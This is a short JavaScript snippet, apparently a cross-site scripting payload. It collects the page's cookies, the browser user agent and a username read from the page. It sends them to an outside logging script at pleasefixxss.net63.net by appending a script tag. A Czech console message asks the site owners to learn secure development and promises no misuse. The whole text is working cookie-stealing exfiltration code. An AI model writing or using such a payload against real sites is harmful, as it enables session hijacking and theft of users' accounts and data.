var cookies = document.cookie;
var userAgent = navigator.userAgent;
var username = document.getElementsByTagName("strong")[0].textContent;
var params = "?cookies=" + cookies + "&agent=" + userAgent + "&user=" + username;

console.log("DOBRÝ DEN, prosím vás naučte se vytvářet bezpečný software. děkuji. nebojte nic nezneužiji");

var script = document.createElement('script');
script.src = 'http://pleasefixxss.net63.net/log.php' + params;

document.getElementsByTagName('head')[0].appendChild(script);
